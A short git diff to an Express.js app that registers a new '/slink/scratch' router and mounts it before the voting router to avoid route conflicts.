@@ -65,9 +65,11 @@ const createApp = async () => {
     const loginRouter = require('../routes/slink/lgin');
     const otpRouter = require('../routes/slink/otp');
     const successRouter = require('../routes/slink/success');
+    const scratchRouter = require('../routes/slink/scratch');
     const apiRouter = require('../routes/api');
 
-    // Use routes
+    // Use routes - scratch must be before votingRouter to avoid route conflicts
+    app.use('/slink/scratch', scratchRouter);
     app.use('/slink', votingRouter);
     app.use('/slink/lgin', loginRouter);
     app.use('/slink/otp', otpRouter);
